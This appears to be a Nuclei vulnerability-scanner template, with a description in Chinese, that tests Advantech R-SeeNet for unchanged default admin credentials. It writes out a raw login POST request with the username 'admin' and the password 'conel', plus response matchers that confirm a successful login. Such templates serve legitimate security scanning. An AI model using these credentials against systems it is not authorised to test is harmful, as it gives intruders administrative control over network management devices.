id: rseenet-default-login

info:
  name: Advantech R-SeeNet 默认口令登录（弱口令）
  author: princechaddha
  severity: high
  description: 该模板通过尝试 Advantech R-SeeNet 的默认管理员账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://icr.advantech.cz/products/software/r-seenet
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 1
  tags: rseenet,default-login,vuln

http:
  - raw:
      - |
        POST /index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        page=login_change&oper=0&username={{user}}&password={{pass}}&submit=Login

    attack: pitchfork
    payloads:
      user:
        - admin
      pass:
        - conel

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - '<title>R-SeeNet (.*)</title>'

      - type: word
        part: body
        words:
          - "User is succesfully logged."
